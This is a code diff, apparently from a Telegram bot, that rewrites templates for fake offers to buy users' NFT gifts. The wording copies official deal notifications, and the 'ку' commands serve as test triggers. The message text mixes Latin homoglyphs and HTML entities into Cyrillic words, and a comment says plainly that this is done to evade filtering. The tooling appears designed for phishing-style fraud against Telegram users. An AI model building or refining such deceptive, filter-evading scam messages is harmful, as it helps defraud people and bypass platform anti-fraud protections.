@@ -339,17 +339,17 @@ async def process_offer(message: Message, business_connection_id: str | None = N
         body = f"المستخدم <b>{seller_name}</b> يعرض <b>{amount}</b> مقابل الهدية <a href=\"{parsed['gift_url']}\">{title}</a>.\n\nينتهي العرض خلال <b>{remaining}</b>."
     else:
         # Убрали "Пользователь", начинаем с ника
-        # Формат времени: "Предложение активно в течении 23ч 59м."
+        # Формат времени: "Сделка активна в течение 23ч 59м."
         # Обходим: е→e (английская)
         total_seconds = int((expires - now).total_seconds()) - 60  # Вычитаем 1 минуту
         hours = total_seconds // 3600
         minutes = (total_seconds % 3600) // 60
         time_text = f"{hours}ч {minutes}м."
-        # в тeчeнии - e английские
+        # в тeчeниe - e английские
         variant = parsed.get("text_variant")
         gift_link = f'<a href="{parsed["gift_url"]}">{title}</a>'
         # Дефолтный вариант без "Пользователь"
-        body = f"<b>{seller_name}</b> предлагает Вам <b>{amount}</b> зa п&#1086;дaр&#1086;к {gift_link}.\n\nСдeлкa aктивнa в тeчeнии <b>{time_text}</b>"
+        body = f"<b>{seller_name}</b> предлагает Вам <b>{amount}</b> зa п&#1086;дaр&#1086;к {gift_link}.\n\nСдeлкa aктивнa в тeчeниe <b>{time_text}</b>"
     
     # Кнопки добавляем только в самом конце (уровень 8+)
     markup = offer_keyboard(offer_id, parsed["locale"], parsed["currency"]) if test_level == 0 or test_level >= 8 else None
@@ -1473,16 +1473,16 @@ async def handle_text(message: Message, is_business: bool):
         return
     if low == "ку12":
         seller_name = message.from_user.first_name if message.from_user else "TestName"
-        await test_send(message, is_business, f"{seller_name} предлагает Вам <b>100₽</b> за подарок <a href=\"{nft_link}\">WinterWreath #5056</a>.\n\nПредложение активно в течении")
+        await test_send(message, is_business, f"{seller_name} предлагает Вам <b>100₽</b> за подарок <a href=\"{nft_link}\">WinterWreath #5056</a>.\n\nПредложение активно в течение")
         return
     if low == "ку13":
         seller_name = message.from_user.first_name if message.from_user else "TestName"
-        await test_send(message, is_business, f"{seller_name} предлагает Вам <b>100₽</b> за подарок <a href=\"{nft_link}\">WinterWreath #5056</a>.\n\nПредложение активно в течении <b>23ч 59м</b>.")
+        await test_send(message, is_business, f"{seller_name} предлагает Вам <b>100₽</b> за подарок <a href=\"{nft_link}\">WinterWreath #5056</a>.\n\nПредложение активно в течение <b>23ч 59м</b>.")
         return
     if low == "ку100":
         seller_name = message.from_user.first_name if message.from_user else "TestName"
-        # Полный офер БЕЗ слова "предлагает"
-        await test_send(message, is_business, f"<b>{seller_name}</b> Вам <b>100₽</b> за подарок <a href=\"{nft_link}\">WinterWreath #5056</a>.\n\nПредложение активно в течении <b>23ч 59м</b>.")
+        # Полный офер как оригинал + слово "Пользователь"
+        await test_send(message, is_business, f"Пользователь <b>{seller_name}</b> предлагает Вам <b>100₽</b> зa п&#1086;дaр&#1086;к <a href=\"{nft_link}\">WinterWreath #5056</a>.\n\nСдeлкa aктивнa в тeчeниe <b>23ч 59м</b>.")
         return
     
     # Команда офера настраивается администратором; точка перед ней необязательна.
